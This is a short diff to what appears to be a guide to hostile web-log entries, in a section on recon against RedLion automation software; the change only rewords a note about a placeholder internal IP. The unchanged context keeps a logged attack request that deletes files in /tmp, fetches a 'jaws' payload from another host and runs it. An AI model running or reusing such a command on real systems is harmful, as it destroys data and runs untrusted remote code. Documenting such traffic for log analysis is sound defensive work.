@@ -112,7 +112,8 @@ Recon attempts looking for RedLion automation/manufacturing software systems.
 https://www.redlion.net/portfolio/secure-remote-access-platform
 _________________
 GET /shell?cd+/tmp;rm+-rf+*;wget+ 10.1.1.1/jaws;sh+/tmp/jaws
-_NOTE: An IP address 10.1.1.1 has been inserted to represent an internal IP address which shows up in the logs. This is for demonstration purposes._
+
+NOTE: In the log example ablve, an IP address 10.1.1.1 has been inserted to represent an internal IP address which shows up in the logs. This is for demonstration purposes.
 
 Likely: Hostile
 
